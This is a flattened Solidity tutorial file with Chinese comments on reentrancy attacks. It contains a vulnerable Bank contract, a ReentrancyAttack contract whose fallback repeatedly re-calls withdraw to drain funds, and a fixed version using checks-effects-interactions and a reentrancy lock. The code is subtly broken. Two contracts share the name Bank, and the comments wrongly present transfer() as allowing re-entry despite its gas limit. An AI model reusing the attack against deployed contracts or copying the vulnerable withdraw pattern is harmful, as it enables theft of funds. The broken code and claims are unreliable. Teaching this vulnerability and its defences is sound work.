
/** 
 *  SourceUnit: c:\Users\Administrator\Desktop\example4all\example4solidity\advanced\security\_01_ReentrancyAttack.sol
*/

////// SPDX-License-Identifier-FLATTEN-SUPPRESS-WARNING:GPL-3.0
pragma solidity ^0.8.17;

/**
 * https://github.com/WTFAcademy/WTF-Solidity/tree/main/S01_ReentrancyAttack
 * 1. 如果某个合约实现了给我们转账的功能, 比如取钱
 * 2. 那么合约在调用transfer的时候, 会触发我们的fallback函数(不实现receive函数), 并扣除我们的余额
 * 3. 如果扣除余额是在转账之后进行的, 那么我们可以在fallback函数中再次调用合约的取钱函数, 从而实现重入攻击
 */
/**
 * 下面是重入攻击的例子
 */
contract Bank {
    mapping(address => uint) public balanceOf;

    function deposit() public payable {
        balanceOf[msg.sender] += msg.value;
    }

    function withdraw(uint amount) public {
        require(balanceOf[msg.sender] >= amount, "Insufficient balance");
        // transfer会触发我们合约的fallback函数, 我们可以在fallback函数中再次调用withdraw函数
        // 因为余额是在转账之后进行修改的, 所以我们可以重入攻击
        payable(msg.sender).transfer(amount);
        balanceOf[msg.sender] -= amount;
    }
}

contract ReentrancyAttack {
    Bank bank;

    constructor(Bank _bank) {
        bank = _bank;
    }

    // fallback函数会在transfer触发
    fallback() external payable {
        // 检查余额, 如果余额足够, 那么再次调用withdraw函数
        if (address(bank).balance >= 1 ether) {
            bank.withdraw(1 ether);
        }
    }

    /**
     * 攻击函数
     */
    function attack() public payable {
        // 先存入1个以太币, 然后进行攻击
        bank.deposit{value: 1 ether}();
        bank.withdraw(1 ether);
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

/**
 * 预防重入攻击的办法
 *  1. 按照检查 -- 修改状态 -- 执行的顺序来编写代码
 *  2. 使用重入锁来保证在一个交易中, 函数只能被调用一次
 */
contract Bank {
    mapping(address => uint) public balanceOf;

    function deposit() public payable {
        balanceOf[msg.sender] += msg.value;
    }

    /**
     * 方法1: 按照检查 -- 修改状态 -- 执行的顺序来编写代码
     */
    function withdraw(uint amount) public {
        require(balanceOf[msg.sender] >= amount, "Insufficient balance");
        // 先进行余额的修改, 可以防止重入攻击
        balanceOf[msg.sender] -= amount;
        payable(msg.sender).transfer(amount);
    }

    // bool private locked = false;
    // modifier nonReentrant() {
    //     require(!locked, "Reentrant call");
    //     locked = true;
    //     _;
    //     locked = false;
    // }
    /**
     * 使用重入锁进行保护之后, 转账和修改余额的顺序就不重要了
     */
    // function withdraw(uint amount) public nonReentrant {
    //     require(balanceOf[msg.sender] >= amount, "Insufficient balance");
    //     // 先进行余额的修改, 可以防止重入攻击
    //     balanceOf[msg.sender] -= amount;
    //     payable(msg.sender).transfer(amount);
    // }
}

